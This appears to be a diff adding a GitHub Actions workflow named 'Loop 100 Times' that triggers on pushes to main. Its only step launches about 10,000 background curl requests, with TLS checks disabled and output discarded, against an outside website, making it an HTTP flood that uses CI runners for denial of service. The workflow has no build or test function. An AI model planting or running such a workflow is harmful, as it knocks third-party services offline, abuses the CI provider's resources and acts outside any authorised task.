@@ -1,0 +1,34 @@
+name: Loop 100 Times af7039a9-9924-44e8-b0b8-79fcc375d5b4
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  loop_job:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Run loop 100 times af7039a9-9924-44e8-b0b8-79fcc375d5b4
+        id: loop_step
+        run: |
+          counter=0
+          max_loops=100
+          target="https://v6.zero.bs/"
+          while [ $counter -lt 100 ]; do
+            echo "Running loop iteration $((counter + 1))..."
+            curl_loop=0
+            while [ $curl_loop -lt $max_loops ]; do
+              curl -ks "$target" 2>&1 > /dev/null &
+              curl_loop=$((curl_loop + 1))
+            done
+            echo " [+] started $max_loops processes "
+            curl -ks "$target" 2>&1 > /dev/null
+            
+            counter=$((counter + 1))
+          done
+          echo ">> DONE!"
+
+
+
+
